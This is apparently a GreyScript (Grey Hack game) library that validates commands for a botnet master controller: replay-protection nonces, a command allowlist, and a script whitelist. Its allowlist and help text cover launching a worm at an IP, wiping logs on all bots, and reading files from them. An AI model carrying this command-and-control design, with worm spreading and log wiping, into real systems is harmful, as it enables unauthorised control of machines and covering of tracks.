// ============================================
// Shared Command Validation Library
// Eliminates code duplication between master and slave
// ============================================

// ============================================
// Replay Attack Prevention (Item 33)
// ============================================

// Disk-backed nonce storage for large botnets (Performance optimization)
NONCE_DB_FILE = "/root/.botnet/seen_nonces.txt"
globals.seen_nonces = {}
globals.nonce_cleanup_interval = 300  // Clean old nonces every 5 minutes (more frequent)
globals.nonce_cleanup_threshold = 100  // Clean after 100 new nonces
globals.nonces_since_cleanup = 0
globals.last_nonce_cleanup = time
globals.nonces_since_save = 0

// Load nonces from disk at startup
load_nonces = function()
    if globals.seen_nonces.len > 0 then return  // Already loaded
    
    content = read_file(NONCE_DB_FILE)
    if content then
        lines = content.split(char(10))
        for line in lines
            if line.len > 0 then
                parts = line.split(":")
                if parts.len == 2 then
                    globals.seen_nonces[parts[0]] = parts[1].to_int
                end if
            end if
        end for
        log_master("Loaded " + str(globals.seen_nonces.len) + " nonces from disk", "DEBUG")
    end if
end function

// Save nonces to disk
save_nonces = function()
    lines = []
    for nonce in globals.seen_nonces.indexes
        lines.push(nonce + ":" + str(globals.seen_nonces[nonce]))
    end for
    
    if safe_file_write(NONCE_DB_FILE, lines.join(char(10))) then
        log_master("Saved " + str(lines.len) + " nonces to disk", "DEBUG")
        globals.nonces_since_save = 0
    else
        log_master("WARNING: Failed to save nonces to disk", "WARN")
    end if
end function

// Generate a cryptographically-secure-ish nonce with collision resistance
generate_nonce = function()
    // Use time + random + PID for uniqueness with enhanced entropy (Item 33)
    nonce = str(time) + "_" + str(floor(rnd * 1000000000)) + "_" + str(get_shell.pid) + "_" + str(floor(rnd * 1000000))
    return nonce
end function

// Validate command includes timestamp and nonce with clock skew tolerance
validate_command_with_replay_protection = function(cmd_with_meta)
    if cmd_with_meta == null or cmd_with_meta == "" then return null
    
    // Expected format: "TIMESTAMP:NONCE:COMMAND"
    // Example: "1704067200:abc123_456789_12345:run /bin/slave.gs"
    
    parts = cmd_with_meta.split(":")
    if parts.len < 3 then
        log_master("ERROR: Command missing timestamp or nonce", "ERROR")
        return null
    end if
    
    timestamp_str = parts[0]
    nonce = parts[1]
    command = parts.join(":", 2)  // Rejoin remaining parts (command might have colons)
    
    // Validate timestamp
    timestamp = timestamp_str.to_int
    if typeof(timestamp) != "number" then
        log_master("ERROR: Invalid timestamp in command", "ERROR")
        return null
    end if
    
    current_time = time
    age = current_time - timestamp
    
    // Reject if older than 5 minutes (300 seconds)
    if age > 300 then
        log_master("ERROR: Command timestamp too old (" + str(age) + "s), rejecting (possible replay)", "WARN")
        return null
    end if
    
    // Allow future timestamps up to 60s (increased from 30s for clock skew)
    if age < -60 then
        log_master("ERROR: Command timestamp too far in future (" + str(age) + "s), rejecting", "WARN")
        return null
    end if
    
    // Check if nonce was already seen (replay attack)
    if globals.seen_nonces.hasIndex(nonce) then
        log_master("ERROR: Duplicate nonce detected (" + nonce + "), rejecting (replay attack!)", "ERROR")
        return null
    end if
    
    // Record nonce as seen
    globals.seen_nonces[nonce] = current_time
    globals.nonces_since_save = globals.nonces_since_save + 1
    globals.nonces_since_cleanup = globals.nonces_since_cleanup + 1
    
    // Save to disk every 100 new nonces or on shutdown
    if globals.nonces_since_save >= 100 then
        save_nonces()
    end if
    
    // ✅ NEW: Cleanup if threshold reached
    if globals.nonces_since_cleanup >= globals.nonce_cleanup_threshold then
        cleanup_old_nonces(current_time)
        globals.nonces_since_cleanup = 0
    end if
    
    // Periodic cleanup: remove old nonces (older than 10 minutes)
    if current_time - globals.last_nonce_cleanup > globals.nonce_cleanup_interval then
        cleanup_old_nonces(current_time)
        globals.last_nonce_cleanup = current_time
        // Also save after cleanup
        save_nonces()
    end if
    
    return command
end function

cleanup_old_nonces = function(current_time)
    nonce_ttl = 600  // Keep nonces for 10 minutes
    old_nonces = []
    current_nonces = globals.seen_nonces.indexes  // ✅ Cache indexes
    for nonce in current_nonces
        if current_time - globals.seen_nonces[nonce] > nonce_ttl then
            old_nonces.push(nonce)
        end if
    end for
    for nonce in old_nonces
        globals.seen_nonces.remove(nonce)
    end for
    if old_nonces.len > 0 then
        log_master("Cleaned up " + str(old_nonces.len) + " old nonces (" + str(globals.seen_nonces.len) + " remaining)", "DEBUG")
    end if
end function

// Initialize nonce storage
load_nonces()

// Validate command structure before broadcasting
validate_command = function(cmd)
    if cmd == null then return false
    if typeof(cmd) != "string" then return false
    if cmd.len == 0 then return false
    
    // Load max command length from config
    import_code("/scripts/utils/botnet_config.gs")
    max_length = get_config("ui.max_command_length")
    if max_length == null then max_length = 1024
    
    if cmd.len > max_length then return false
    
    parts = cmd.split(" ")
    if parts.len == 0 then return false
    
    // Check command is in allowed list
    allowed = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate", "help"]
    if allowed.indexOf(parts[0]) == null then return false
    
    // Validate each part contains only printable characters
    for part in parts
        for c in part
            code = c.code
            if code < 32 or code > 126 then return false
        end for
    end for
    
    // Validate argument structure based on command
    if parts[0] == "run" then
        if parts.len < 2 then return false
        // Script path must not contain multiple consecutive slashes
        script_path = parts[1]
        if script_path.indexOf("//") != null then return false
        // Max 4 additional args
        if parts.len > 6 then return false
    else if parts[0] == "worm" then
        if parts.len < 3 then return false
        // Depth must be a number
        depth = parts[2].to_int
        if typeof(depth) != "number" then return false
        if depth < 0 or depth > 10 then return false
    else if parts[0] == "kill" then
        if parts.len < 2 then return false
    else if parts[0] == "read" then
        if parts.len < 2 then return false
        // File path must not contain //
        if parts[1].indexOf("//") != null then return false
    end if
    
    return true
end function

// Validate script arguments for security
validate_script_args = function(script, args)
    // Load allowed scripts from config
    import_code("/scripts/utils/botnet_config.gs")
    allowed_scripts = get_config("security.allowed_scripts")
    if allowed_scripts == null then
        // Fallback to hardcoded list if config fails
        allowed_scripts = [
            "/bin/slave.gs",
            "/bin/worm.gs",
            "/scripts/utils/forensics/wipe_logs.gs",
            "/scripts/utils/file_search.gs",
            "/scripts/utils/find_lib.gs",
            "/scripts/utils/accessLevel.gs"
        ]
    end if
    
    // Check if script is in whitelist
    if allowed_scripts.indexOf(script) == null then return false
    
    // Whitelist approach: only allow alphanumeric, dots, dashes, underscores, slashes
    allowed_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_/"
    
    for arg in args
        if arg.len > 256 then return false  // Max arg length
        for c in arg
            if allowed_chars.indexOf(c) == null then return false
        end for
    end for
    
    return true
end function

// Enhanced error messages for better user feedback
format_error = function(error_type, details)
    import_code("/scripts/utils/botnet_config.gs")
    verbose = get_config("ui.verbose_errors")
    if verbose == null then verbose = true
    
    if verbose then
        if error_type == "INVALID_COMMAND" then
            return "ERROR: Invalid command format. Type 'help' for available commands."
        else if error_type == "SCRIPT_NOT_ALLOWED" then
            return "ERROR: Script not in allowed list. Script: " + details
        else if error_type == "ACCESS_DENIED" then
            return "ERROR: Access denied. Path: " + details + " (outside allowed directories)"
        else if error_type == "FILE_NOT_FOUND" then
            return "ERROR: File not found: " + details
        else if error_type == "NETWORK_FAILED" then
            return "ERROR: Network operation failed: " + details + " (retrying...)"
        else
            return "ERROR: " + error_type + " - " + details
        end if
    else
        return "ERROR: " + error_type
    end if
end function

// Help system for better user experience
show_help = function()
    help_text = "
Botnet Master Controller Commands:
============================

Core Commands:
--------------
run <script> [args...]  - Execute script on target bots
kill <script>           - Stop running script on all bots
update                  - Update bot software on all bots
status                  - Get status from all bots
clean                   - Clean logs on all bots
worm <depth> <ip>      - Launch worm with specified depth
read <file>             - Read file from target bots
rotate                 - Rotate encryption keys
help                    - Show this help message

Examples:
---------
run /bin/slave.gs       - Execute slave on all bots
worm 3 192.168.1.100  - Launch worm at depth 3
status                   - Get bot status and health

Security Notes:
---------------
- All commands are validated before execution
- Scripts must be in allowed whitelist
- File paths are restricted to safe directories
- Network operations include automatic retry logic

For more detailed information, consult the deployment guide.
"
    
    print(help_text)
    return "HELP_SHOWN"
end function
